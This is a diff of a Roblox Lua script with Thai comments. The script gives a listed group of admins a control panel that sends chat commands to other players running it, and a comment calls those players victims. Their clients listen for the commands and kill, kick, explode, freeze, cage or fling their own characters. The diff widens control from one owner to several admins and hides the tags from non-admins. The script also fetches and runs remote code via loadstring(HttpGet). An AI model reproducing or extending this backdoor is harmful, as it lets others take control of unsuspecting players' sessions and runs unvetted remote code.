@@ -1,16 +1,31 @@
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-local OwnerID = 1697390697 -- UserId ของน้อง
 
--- [[ ฟังก์ชันสร้างป้าย ADMIN / 191 ]]
+-- [ รายชื่อแอดมินทั้งหมด ]
+local AdminList = {
+    [1697390697] = "OWNER",      -- ตัวน้อง
+    [9802544328] = "ADMIN",      -- เพื่อนคนที่ 1
+    [6030349781] = "ADMIN",      -- เพื่อนคนที่ 2
+    [10339491848] = "ADMIN"      -- เพื่อนคนที่ 3
+}
+
+-- ฟังก์ชันเช็คว่าเป็นแอดมินไหม
+local function IsAdmin(id)
+    return AdminList[id] ~= nil
+end
+
+-- [[ ฟังก์ชันสร้างป้ายแบบแยกมุมมอง - กลุ่มแอดมินเท่านั้นที่เห็น ]]
 local function CreateTag(targetPlayer, text, color, trans)
-    targetPlayer.CharacterAdded:Connect(function(char)
+    local function ApplyTag(char)
         local head = char:WaitForChild("Head", 10)
         if not head then return end
-        
-        -- ลบป้ายเก่าถ้ามี
         if head:FindFirstChild("Tag191") then head.Tag191:Destroy() end
+
+        -- *** เฉพาะคนที่เป็นแอดมินเท่านั้นถึงจะมองเห็นป้าย ***
+        if not IsAdmin(LocalPlayer.UserId) then
+            return 
+        end
 
         local bgui = Instance.new("BillboardGui", head)
         bgui.Name = "Tag191"
@@ -31,9 +46,10 @@ local function CreateTag(targetPlayer, text, color, trans)
         label.TextColor3 = color
         label.TextSize = 18
         label.Font = Enum.Font.GothamBold
-    end)
-    -- รันซ้ำเผื่อกรณีรันสคริปต์ตอนเกิดอยู่แล้ว
-    if targetPlayer.Character then targetPlayer.CharacterAdded:Fire(targetPlayer.Character) end
+    end
+
+    targetPlayer.CharacterAdded:Connect(ApplyTag)
+    if targetPlayer.Character then ApplyTag(targetPlayer.Character) end
 end
 
 -- [[ ระบบสั่งการที่จะรันในเครื่องเหยื่อ ]]
@@ -51,8 +67,7 @@ local function RunCommand(cmd)
         bv.MaxForce = Vector3.new(0, math.huge, 0)
         task.wait(3) bv:Destroy()
     elseif cmd == "!boom" then
-        local ex = Instance.new("Explosion", workspace)
-        ex.Position = hrp.Position
+        Instance.new("Explosion", workspace).Position = hrp.Position
     elseif cmd == "!freeze" then hrp.Anchored = not hrp.Anchored
     elseif cmd == "!cage" then
         local p = Instance.new("Part", workspace)
@@ -71,10 +86,10 @@ local function RunCommand(cmd)
     end
 end
 
--- [[ ระบบดักฟังแชท ]]
+-- [[ ระบบดักฟังแชทจากกลุ่มแอดมิน ]]
 local function Listen(player)
     player.Chatted:Connect(function(msg)
-        if player.UserId == OwnerID then
+        if IsAdmin(player.UserId) then -- เช็คว่าคนสั่งเป็นหนึ่งในแอดมินไหม
             local args = string.split(msg:lower(), " ")
             if args[2] and string.find(LocalPlayer.Name:lower(), args[2]) then
                 RunCommand(args[1])
@@ -84,22 +99,23 @@ local function Listen(player)
 end
 
 -- [[ แยกส่วนการทำงาน ]]
-if LocalPlayer.UserId == OwnerID then
-    CreateTag(LocalPlayer, "ADMIN", Color3.new(1,1,1), 0.2)
+local myRole = AdminList[LocalPlayer.UserId]
+if myRole then
+    CreateTag(LocalPlayer, myRole, Color3.new(1,1,1), 0.2)
 else
     CreateTag(LocalPlayer, "191", Color3.new(1,1,1), 0.5)
     for _, p in pairs(Players:GetPlayers()) do Listen(p) end
     Players.PlayerAdded:Connect(Listen)
-    return -- คนอื่นจบงานที่นี่ เมนูไม่ขึ้น
+    return 
 end
 
--- [[ ส่วนของ MASTER ADMIN (เฉพาะน้อง) ]]
-local Window = Rayfield:CreateWindow({ Name = "191 CONTROL HUB (MASTER)" })
-local MainTab = Window:CreateTab("Users", 4483362458)
+-- [[ ส่วนของ MASTER UI (แอดมินทุกคนเห็นเมนู) ]]
+local Window = Rayfield:CreateWindow({ Name = "191 ADMIN TEAM HUB" })
+local MainTab = Window:CreateTab("Control", 4483362458)
 local Selected = ""
 
 local Dropdown = MainTab:CreateDropdown({
-   Name = "Target (191 Users Only)",
+   Name = "Target (191 Users)",
    Options = {},
    Callback = function(Option) Selected = Option end,
 })
@@ -107,8 +123,9 @@ local Dropdown = MainTab:CreateDropdown({
 local function Refresh()
     local list = {}
     for _, p in pairs(Players:GetPlayers()) do
-        if p.Character and p.Character:FindFirstChild("Head") and p.Character.Head:FindFirstChild("Tag191") then
-            if p ~= LocalPlayer then table.insert(list, p.Name) end
+        -- เช็คว่าคนนั้นไม่ใช่แอดมิน และมีป้าย 191 (ที่แอดมินมองเห็น)
+        if not IsAdmin(p.UserId) and p.Character and p.Character:FindFirstChild("Head") and p.Character.Head:FindFirstChild("Tag191") then
+            table.insert(list, p.Name)
         end
     end
     Dropdown:Set(list)
@@ -123,15 +140,10 @@ local function Send(c)
     end
 end
 
-MainTab:CreateSection("Actions")
-MainTab:CreateButton({ Name = "Kill", Callback = function() Send("!kill") end })
-MainTab:CreateButton({ Name = "Kick", Callback = function() Send("!kick") end })
-MainTab:CreateButton({ Name = "Fly", Callback = function() Send("!fly") end })
-MainTab:CreateButton({ Name = "Boom", Callback = function() Send("!boom") end })
-MainTab:CreateButton({ Name = "Freeze", Callback = function() Send("!freeze") end })
-MainTab:CreateButton({ Name = "Cage", Callback = function() Send("!cage") end })
-MainTab:CreateButton({ Name = "Sit", Callback = function() Send("!sit") end })
-MainTab:CreateButton({ Name = "HARD FLING", Callback = function() Send("!fling") end })
+MainTab:CreateSection("Commands")
+local cmds = {"!kill", "!kick", "!fly", "!boom", "!freeze", "!cage", "!sit", "!fling"}
+for _, v in pairs(cmds) do
+    MainTab:CreateButton({ Name = v:sub(2):upper(), Callback = function() Send(v) end })
+end
 
 Refresh()
-
